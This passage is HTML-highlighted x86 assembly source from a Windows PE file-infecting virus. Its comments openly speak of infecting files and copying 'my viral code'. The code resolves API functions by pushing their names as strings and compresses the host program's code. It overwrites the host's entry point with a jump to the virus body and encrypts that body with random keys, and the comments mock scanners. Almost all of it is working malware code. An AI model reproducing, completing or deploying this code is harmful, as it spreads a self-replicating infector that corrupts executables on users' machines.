   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9ch</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;   how much space we still have</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   add offset to file</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@008</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">SII</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">loader_size</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@003</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">; Look for &lt;GetProcAddress&gt; &amp; &lt;GetModuleHandle/LoadLibrary&gt;</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">128</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@015</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'erdd'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Acor'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'PteG'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc1">;  GetProcAddress</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">it@001</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@017</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'yra'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'rbiL'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'daoL'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc1">;  LoadLibrary</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">it@001</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@018</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@016</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'naHe'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ludo'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'MteG'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc1">;  GetModuleHandle</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">it@001</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@018</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">

   </span><span class="sc5">infectar@016</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">convert@006</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  [convert@005]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@005</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  Could import table be overwrited ?</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">infectar@006</span><span class="sc0">         </span><span class="sc1">;  no, let's infect</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@005</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">         </span><span class="sc1">;  yes ... go out</span><span class="sc0">

   </span><span class="sc5">infectar@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CAN I TRY TO INFECT THIS FILE ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc1">; ok, let's alloc some memory and compact PE code</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@008</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalAlloc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@019</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loadmem@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">loader_size</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@014</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loadmem@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;   no callback</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workmem</span><span class="sc0">     </span><span class="sc1">;   work memory</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@008</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;   size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@019</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;   to compress to...</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@006</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;   where it starts (entry point)</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;   Mapview</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ap_pack</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@010</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save new size</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@007</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loadmem@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@008</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   original size</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loadmem@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@007</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@011</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;   how much space after compress it ?</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@007</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@011</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">loader_size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@007</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@007</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcpyA</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'pk'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'b.el'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'if_·'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ibas'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@007</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_lstrcatA</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@007</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CopyFileA</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@015</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@006</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   where to copy my viral code</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">609Ch</span><span class="sc0">  </span><span class="sc1">;  fixed</span><span class="sc0">
   </span><span class="sc6">stosw</span><span class="sc0">          </span><span class="sc1">;  bytes</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">   </span><span class="sc1">;  :(</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@010</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@014</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc1">;   compressed virus...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@013</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@014</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">;   compressed file data...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@019</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@010</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@014</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@010</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader1_xor</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader1_sub</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader1_xor2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader1_add</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">encrypt@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt@002</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">enc_by_first</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;   they still can try all dwords :P</span><span class="sc0">
